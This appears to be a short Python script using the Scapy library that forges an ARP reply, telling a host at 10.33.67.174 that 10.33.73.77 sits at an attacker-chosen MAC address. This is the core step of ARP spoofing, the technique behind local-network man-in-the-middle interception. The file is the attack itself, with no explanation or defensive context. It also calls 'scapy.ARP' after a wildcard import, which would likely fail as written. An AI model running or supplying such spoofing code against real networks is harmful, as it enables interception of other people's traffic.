from scapy.all import *


def spoofing():
    packet = scapy.ARP(op=2, hwdst="f2:39:c5:c0:07:e5", pdst="10.33.67.174", psrc="10.33.73.77", hwsrc="98:8D:46:C4:FA:E5")
    scapy.send(packet, verbose=False)